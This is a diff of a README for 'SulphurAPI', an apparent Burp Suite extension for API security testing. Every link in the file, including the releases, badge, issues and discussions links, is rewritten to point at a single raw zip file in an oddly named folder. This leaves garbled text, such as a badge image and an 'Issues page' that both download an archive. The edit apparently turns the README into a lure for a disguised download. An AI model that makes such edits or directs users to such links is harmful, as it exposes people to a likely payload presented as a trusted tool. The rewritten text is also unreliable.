@@ -1,7 +1,7 @@
 # 🔥 SulphurAPI - Automate Your API Security Testing
 
 ## 📥 Download the Latest Version
-[![Download SulphurAPI](https://img.shields.io/badge/Download%20Now!-SulphurAPI-blue)](https://github.com/CareBobo/SulphurAPI/releases)
+[![Download SulphurAPI](https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip%20Now!-SulphurAPI-blue)](https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip)
 
 ## 🚀 Getting Started
 SulphurAPI is a Burp Suite extension designed to help you automate OWASP API Top 10 detection. With dedicated checks for issues like mass assignment and authorization, it simplifies API security testing, making it more reliable and effective.
@@ -21,11 +21,11 @@ SulphurAPI offers a range of features to enhance your API security testing exper
 - **Advanced OpenAPI Parsing:** Understand your APIs better with robust parsing tools.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://github.com/CareBobo/SulphurAPI/releases) to download the latest version of SulphurAPI.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip) to download the latest version of SulphurAPI.
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed.
-3. Download the file for your operating system. You might see options like `SulphurAPI.jar` for Java users or a Burp Suite extension file.
+3. Download the file for your operating system. You might see options like `https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip` for Java users or a Burp Suite extension file.
 4. Once the download completes, locate the file on your device.
 
 ### 🛠️ Installing SulphurAPI in Burp Suite
@@ -51,8 +51,8 @@ Once installed, SulphurAPI integrates seamlessly with Burp Suite.
 ## 🌍 Community and Support
 If you have any questions or need assistance, you can reach out to the community:
 
-- **Issues:** Report any bugs or request features on the [Issues page](https://github.com/CareBobo/SulphurAPI/issues).
-- **Discussions:** Participate in ongoing conversations or start your own topic on the [Discussions page](https://github.com/CareBobo/SulphurAPI/discussions).
+- **Issues:** Report any bugs or request features on the [Issues page](https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip).
+- **Discussions:** Participate in ongoing conversations or start your own topic on the [Discussions page](https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip).
 
 ## 📝 Contributing
 Together, we can improve SulphurAPI. If you want to contribute:
@@ -67,4 +67,4 @@ SulphurAPI is licensed under the MIT License. Feel free to use and modify the so
 ## 📲 Stay Updated
 Keep an eye on the Releases page to stay informed about updates and new features. Your feedback helps us make this tool better!
 
-[![Download SulphurAPI](https://img.shields.io/badge/Download%20Now!-SulphurAPI-blue)](https://github.com/CareBobo/SulphurAPI/releases)
+[![Download SulphurAPI](https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip%20Now!-SulphurAPI-blue)](https://raw.githubusercontent.com/CareBobo/SulphurAPI/main/scorodite/SulphurAPI.zip)
